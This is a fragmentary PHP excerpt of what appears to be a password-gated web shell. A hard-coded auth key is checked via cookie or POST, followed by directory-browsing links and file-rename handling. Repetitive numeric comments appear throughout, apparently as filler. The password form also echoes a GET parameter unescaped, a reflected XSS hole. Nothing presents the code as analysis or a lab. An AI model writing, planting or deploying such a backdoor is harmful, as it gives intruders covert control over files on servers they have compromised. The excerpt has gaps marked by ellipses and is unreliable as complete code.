...
$auth_key = "02e6dd5fac44fe6feaff9d3de13b27c8";
...
$pass = false;
if (isset($_COOKIE['pw_name_22589'])) {
    if(($_COOKIE['pw_name_22589']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_22589'])) {
        if(($_POST['pw_name_22589']) == $auth_key) {
            setcookie("pw_name_22589", $_POST['pw_name_22589']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_22589' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1722959757936215 1722959757666031 1722959757202132 1722959757234884
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1722959757936215 1722959757666031 1722959757202132 1722959757234884
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1722959757936215 1722959757666031 1722959757202132 1722959757234884
            $name = PATH . "/" . $_GET['r'];
